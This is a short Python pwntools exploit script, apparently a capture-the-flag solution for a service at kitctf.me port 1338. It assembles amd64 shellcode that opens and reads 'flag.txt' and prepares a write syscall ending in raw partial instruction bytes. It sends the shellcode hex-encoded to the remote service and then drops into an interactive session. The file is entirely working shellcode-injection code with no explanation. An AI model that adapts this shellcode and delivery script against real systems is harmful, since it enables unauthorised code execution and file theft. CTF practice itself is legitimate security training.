#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "kitctf.me", "1338"

shellc = asm('''
  mov eax,0
  mov ecx, 0x67616C66
  mov [rsp],ecx
  mov ecx, 0x7478742E
  mov [rsp+4],ecx
  mov [rsp+8],rax
  mov rdi,rsp
  mov rsi,rax
  mov al,2
  syscall

  mov rdi,rax
  mov rdx,rsp
  mov dx,0
  mov rsi,rdx
  mov edx,0x200
  mov eax,0
  syscall
  mov rdx,rax

  mov eax,1
  mov edi,0
  .byte 0xc6,0x86
''')

if args.DOCKER:
  p = remote('127.0.0.1',1338)
else:
  p = remote(host,port)

# send shellcode encoded in hex
sla('> ', binascii.hexlify(shellc))

p.interactive()

